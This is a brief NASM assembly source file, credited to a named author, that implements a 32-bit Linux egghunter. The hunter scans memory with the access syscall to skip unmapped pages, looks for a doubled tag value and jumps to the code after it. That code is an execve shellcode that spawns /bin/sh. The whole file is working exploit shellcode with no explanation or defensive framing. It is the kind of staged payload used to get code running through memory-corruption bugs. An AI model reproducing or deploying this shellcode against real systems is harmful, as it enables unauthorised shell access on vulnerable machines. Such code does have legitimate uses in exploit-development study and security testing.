; Egghunter in NASM Assembly
; By Hussien Yousef


global _start

section .text

_start:
xor edx, edx
next_page:
or dx, 0xfff
next_addr:
inc edx
lea ebx, [edx+0x4]
push byte 0x21
pop eax
int 0x80
cmp al, 0xf2
jz next_page
mov eax, 0x50905090
mov edi, edx
scasd
jnz next_addr
scasd
jnz next_addr
jmp edi

egg_tag: dd 0x50905090, 0x50905090
payload:
xor eax, eax
xor ecx, ecx
xor edx, edx
mov al, 11
push ecx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
int 0x80
